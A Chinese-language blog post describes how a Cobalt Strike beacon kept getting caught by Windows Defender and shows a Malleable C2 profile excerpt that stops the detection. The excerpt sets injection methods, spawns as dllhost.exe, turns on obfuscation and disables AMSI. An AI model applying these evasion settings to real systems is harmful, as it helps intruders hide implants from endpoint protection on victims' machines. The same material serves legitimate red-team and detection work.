<!DOCTYPE html><html lang="zh"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="stylesheet" href="/css/post.css"><link rel="icon" href="/img/favicon.png"><title>难搞的Defender</title><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body>　　<div class="inner"><h2>难搞的Defender</h2><p>静态处理过的程序，运行之后会因为一些CS的行为被杀，正常上线不操作没问题（前提要配置一份profile），当执行命令或者执行其他job的时候被杀，而且还能识别出来是CobaltStrike的行为。</p>
<p><img src="/2022/06/12/%E9%9A%BE%E6%90%9E%E7%9A%84Defender/image-20220601192347325.png" alt="image-20220601192347325"></p>
<p>目前猜测有两个可能是特征，一是在shellcode下载beacon.dll回来运行CreateThread加载运行的时候，比如下面这个wwanmm.dll（看实际profile中的stage配置）</p>
<p><img src="/2022/06/12/%E9%9A%BE%E6%90%9E%E7%9A%84Defender/image-20220601193230511.png" alt="image-20220601193230511"></p>
<p>另外就是spawn进程的时候也很可疑</p>
<p><img src="/2022/06/12/%E9%9A%BE%E6%90%9E%E7%9A%84Defender/image-20220601192642827.png" alt="image-20220601192642827"></p>
<p>处理下配置文件，换个虚拟机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">    execute &#123;</span><br><span class="line">        #start address does not point to the current process space, fires SYSMON 8 events</span><br><span class="line"></span><br><span class="line">        #self injection</span><br><span class="line">        CreateThread &quot;ntdll!RtlUserThreadStart+0x42&quot;;</span><br><span class="line">        CreateThread &quot;ntdll.dll!RtlUserThreadStart&quot;;</span><br><span class="line">        CreateThread;</span><br><span class="line"></span><br><span class="line">        #suspended process in post-ex jobs, takes over primary thread of temp process</span><br><span class="line">        # SetThreadContext;</span><br><span class="line"></span><br><span class="line">        #early bird technique, creates a suspended process, queues an APC call to the process, resumes main thread to execute the APC.</span><br><span class="line">        NtQueueApcThread-s;</span><br><span class="line"></span><br><span class="line">        #uses an RWX stub, uses CreateThread with start address that stands out, same arch injection only.</span><br><span class="line">        #NtQueueApcThread;</span><br><span class="line"></span><br><span class="line">        #no cross session</span><br><span class="line">        CreateRemoteThread &quot;kernel32.dll!LoadLibraryA+0x1000&quot;;</span><br><span class="line"></span><br><span class="line">        #uses an RWX stub, fires SYSMON 8 events, does allow x86-&gt;x64 injection.</span><br><span class="line">        #c2lint msg -&gt; .process-inject.execute RtlCreateUserThread will cause unpredictable behavior with cross-session injects on XP/200</span><br><span class="line">        RtlCreateUserThread;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">post-ex &#123;</span><br><span class="line">    # Optionally specify non-existent filepath to force manual specification based on the Beacon host&#x27;s running processes</span><br><span class="line">    set spawnto_x86 &quot;%windir%\\syswow64\\dllhost.exe&quot;;</span><br><span class="line">    # Hardcode paths like C:\\Windows\\System32\\dllhost.exe to avoid potential detections for %SYSNATIVE% use. !! This will break when attempting to spawn a 64bit post-ex job from a 32bit Beacon.</span><br><span class="line">    set spawnto_x64 &quot;%windir%\\sysnative\\dllhost.exe&quot;;</span><br><span class="line">    # change the permissions and content of our post-ex DLLs</span><br><span class="line">    set obfuscate &quot;true&quot;;</span><br><span class="line">    # pass key function pointers from Beacon to its child jobs</span><br><span class="line">    set smartinject &quot;true&quot;;</span><br><span class="line">    # disable AMSI in powerpick, execute-assembly, and psinject</span><br><span class="line">    set amsi_disable &quot;true&quot;;</span><br><span class="line">    # Modify our post-ex pipe names</span><br><span class="line">    set pipename &quot;Win32\\StateListener-###-0,&quot;;</span><br><span class="line">    set keylogger &quot;GetAsyncKeyState&quot;;</span><br><span class="line">    #set threadhint &quot;module!function+0x##&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到又正常能用了</p>
<p><img src="/2022/06/12/%E9%9A%BE%E6%90%9E%E7%9A%84Defender/image-20220606233352776.png" alt="image-20220606233352776"></p>
<p><img src="/2022/06/12/%E9%9A%BE%E6%90%9E%E7%9A%84Defender/image-20220606233341329.png" alt="image-20220606233341329"></p>
<p>!</p>
</div><script src="/js/jquery.min.js"></script><script src="/js/main.js"></script></body></html>